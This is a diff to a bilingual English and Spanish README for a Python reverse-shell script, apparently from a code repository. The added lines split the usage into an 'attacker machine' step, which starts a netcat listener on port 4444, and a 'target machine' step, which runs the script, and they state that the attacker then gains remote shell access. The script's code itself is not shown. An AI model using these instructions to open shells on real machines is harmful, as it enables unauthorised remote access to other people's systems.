@@ -14,11 +14,19 @@ This script creates a reverse shell that connects to a remote server, allowing r
 
 ### How to Use:
 
+#### On the Attacker Machine:
+Start a listener to receive the connection:
+```bash
+nc -lvnp 4444
+```
+Ensure the IP and port in the script match the attacker's machine.
+
+#### On the Target Machine:
 Run the script using Python:
 ```bash
 python3 script.py
 ```
-Ensure that the server is listening on the specified IP and port before running the script.
+Once executed, the attacker will have remote shell access.
 
 ### Notes:
 - Script designed for Linux systems.
@@ -41,11 +49,19 @@ Este script crea una shell reversa que se conecta a un servidor remoto, permitie
 
 ### Cómo usarlo:
 
+#### En la Máquina Atacante:
+Inicia un listener para recibir la conexión:
+```bash
+nc -lvnp 4444
+```
+Asegúrate de que la IP y el puerto en el script coincidan con la máquina atacante.
+
+#### En la Máquina Objetivo:
 Ejecuta el script usando Python:
 ```bash
 python3 script.py
 ```
-Asegúrate de que el servidor esté escuchando en la IP y puerto especificados antes de ejecutar el script.
+Una vez ejecutado, el atacante tendrá acceso a la shell remota.
 
 ### Notas:
 - Script diseñado para sistemas Linux.
